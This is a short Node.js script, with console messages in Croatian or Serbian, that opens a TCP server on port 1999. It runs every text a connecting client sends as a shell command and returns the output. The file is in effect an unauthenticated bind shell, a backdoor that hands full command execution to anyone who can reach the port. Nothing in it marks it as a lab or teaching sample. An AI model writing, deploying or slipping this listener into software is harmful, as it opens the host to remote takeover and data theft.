const net = require("net");


const serverSocket = new net.createServer(clientConnected);

const exec = require('child_process').exec;



function clientConnected(client) {
    console.log("~Čoek se spojio");
    client.on("data", data => {

            exec(data.toString(), function (Error, stdout) {
                if (Error) {
                    throw Error;
                } else {
                    client.write(stdout);
                }
            })


            client.on("end", () => {
                console.log("~Čoek se odspojio");
            })
        })
    }

    serverSocket.listen(1999, () => {
        console.log("~Connected to localhost: 1999")
    });